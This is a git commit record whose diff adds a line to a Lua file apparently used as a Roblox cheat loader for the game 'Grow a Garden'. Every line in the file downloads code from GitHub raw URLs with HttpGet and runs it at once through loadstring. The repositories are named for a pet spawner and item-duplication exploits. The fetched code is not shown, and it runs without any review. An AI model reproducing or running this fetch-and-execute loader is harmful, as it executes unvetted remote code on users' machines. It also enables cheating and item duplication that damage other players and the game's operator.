256e9895dd13009377395ffc10015330d6cbe5d5
bestscript-hk99 <hak91209@gmail.com>
2025-05-29 20:03:20 +0700

    Update growagraden.lua

--- growagraden.lua
+++ growagraden.lua
@@ -1,2 +1,3 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/SpaceScriptHUB/petspawner/refs/heads/main/GrowaGardenVisual", true))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/bestscript-hk99/dupeingrowagraden-/refs/heads/main/dupe.lua", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/bestscript-hk99/dupeingrowagraden-/refs/heads/main/v2new.lua.txt"))()
